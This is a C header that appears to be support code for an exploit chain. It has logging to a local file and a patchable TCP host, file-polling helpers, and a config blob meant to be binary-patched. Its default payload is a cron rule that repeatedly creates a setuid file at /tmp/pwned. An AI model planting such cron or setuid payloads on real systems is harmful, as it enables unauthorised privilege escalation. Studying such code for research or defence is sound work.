#pragma once

#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define log addasdasd

#define A0 "CONFIG"
#define A1 A0 A0
#define A2 A1 A1
#define A3 A2 A2
#define A4 A3 A3
#define A5 A4 A4
#define A6 A5 A5
#define A7 A6 A6
#define A8 A7 A7

// This can be left as is for default, or patched up to change config
// Format: cronrule "\0" log_host "\0" log_port "\0"
const char config[] = "PUTHERE" A8;

const char* cronrule = "* * * * * touch /tmp/pwned; chmod 4755 /tmp/pwned";
const char* log_host = "127.0.0.1";
int log_port = 1337;
bool debug_mode = false;

const char* svc_name;

long long microsecs() {
  struct timeval tv;
  gettimeofday(&tv, 0);
  return 1000000ll * tv.tv_sec + tv.tv_usec;
}

int log_fd = 0, log_socket = 0;
long long init_time;

void writeall(int fd, const unsigned char* buf, size_t sz, bool need) {
  while (sz > 0) {
    size_t tx = write(fd, buf, sz);
    if (tx <= 0 && (need || debug_mode)) abort();
    sz -= tx;
    buf += tx;
  }
}

void readall(int fd, char* buf, size_t size, bool need) {
  while(size) {
    int tx = read(fd, buf, size);
    if (tx <= 0 && (need || debug_mode)) abort();
    buf += tx;
    size -= tx;
  }
}


void log(const char* fmt, ...) {
  char buf[1024] = {0};

  long long t = microsecs() - init_time;
  snprintf(buf, sizeof buf, "[%04lld.%03lld %.4s] ",
      t / 1000000, (t % 1000000) / 1000, svc_name);
  if (log_fd) writeall(log_fd, (unsigned char*)buf, strlen(buf), false);
  if (log_socket) {
    writeall(log_socket, (unsigned char*)svc_name, strlen(svc_name), false);
    writeall(log_socket, (unsigned char*)":", 1, false);
  }

  va_list args;
  va_start(args, fmt);
  vsnprintf(buf, sizeof buf, fmt, args);
  va_end(args);

  if (log_fd) writeall(log_fd, (unsigned char*)buf, strlen(buf), false);
  if (log_socket) writeall(log_socket, (unsigned char*)buf, strlen(buf), false);
}

void log_config() {
  log("Using config: log_host = %s, log_port = %d, debug_mode = %s\n",
      log_host, log_port, debug_mode?"on":"off");
}

void parse_config() {
  const char* ptr = config;
  // check if config was patched in
  if (strncmp(ptr, "CONFIG", 6)) {
    cronrule = ptr;
    while(*ptr) ++ptr;
    ++ptr;

    log_host = ptr;
    while(*ptr) ++ptr;
    ++ptr;

    log_port = atoi(ptr);
    while(*ptr) ++ptr;
    ++ptr;

    debug_mode = !!atoi(ptr);
  }
  log_config();
}

void init(const char* svc) {
  init_time = microsecs();
  svc_name = svc;

  char log_file[1024];
  snprintf(log_file, sizeof log_file - 1,
      "/cores/log_%s_pid_%d_time_%lld",
      svc, getpid(), init_time / 1000000);

  log_fd = open(log_file, O_CREAT|O_TRUNC|O_WRONLY, 0644);
  if (log_fd < 0)
    log_fd = 0;

  parse_config();

  int sockfd;
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    log("Error while connecting to logging socket: socket() failed: %s\n",
          strerror(errno));
    goto finish;
  }

  struct sockaddr_in server_addr;
  bzero(&server_addr, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(log_port);

  inet_pton(AF_INET, log_host, &server_addr.sin_addr);

  if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    log("Error while connecting to logging socket: connect() failed: %s\n",
          strerror(errno));
    goto finish;
  }
  log_socket = sockfd;

finish:
  log("Logging initialized for %s\n", svc);
  log_config();
}

void write_file(const char* fname, const void* buf, size_t size) {
  int f = open(fname, O_CREAT|O_TRUNC|O_WRONLY, 0777);
  writeall(f, buf, size, true);
  close(f);
}

void write_marker(const char* fname) {
  write_file(fname, "1337", 4);
}

void msleep(uint64_t millisecs) {
  struct timespec t;
  t.tv_sec = millisecs / 1000;
  t.tv_nsec = millisecs % 1000 * 1000000;
  nanosleep(&t, 0);
}

int wait_for_file(const char* fname) {
  int f;
  while((f = open(fname, 0, 0)) < 0)
    msleep(50);
  return f;
}

void wait_for_dir(const char* fname) {
  int f;
  while (0 > (f = open(fname, O_DIRECTORY)))
    msleep(50);
  close(f);
}

void wait_for_file_to_disappear(const char* fname) {
  int f;
  while((f = open(fname, 0, 0)) >= 0) {
    close(f);
    msleep(50);
  }
}

// TODO don't fail in production!!!!!!!!!11
void assert_fail(const char* msg, const char* file, int line) {
  char buf[1024];
  snprintf(buf, sizeof buf - 1, "Assert failed: %s at %s:%d", msg, file, line);
  log(buf);
  if (debug_mode) {
    sleep(2);
    abort();
  }
}

#undef assert
#define assert(EX) (void)((EX) || (assert_fail (#EX, __FILE__, __LINE__),0))
